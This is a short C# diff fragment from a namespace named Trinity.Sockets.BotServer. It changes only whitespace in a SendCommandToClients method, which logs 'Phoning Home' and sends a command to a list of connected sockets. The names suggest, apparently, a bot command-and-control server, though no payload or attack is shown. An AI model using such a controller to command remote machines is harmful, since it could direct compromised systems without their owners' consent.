@@ -14,7 +14,7 @@ namespace Trinity.Sockets.BotServer
     {
         private static int botCount = 2;
         private static List<Socket> ServerHandlers = new List<Socket>();
-        public static void SendCommandToClients(string Command)
+        public static void SendCommandToClients(string Command) 
         {
             LogHandler.Log(LogHandler.Colors.Yellow, $"[{DateTime.Now}] Phoning Home: {Command}", false, false);
             (from s in BotServer.ServerHandlers
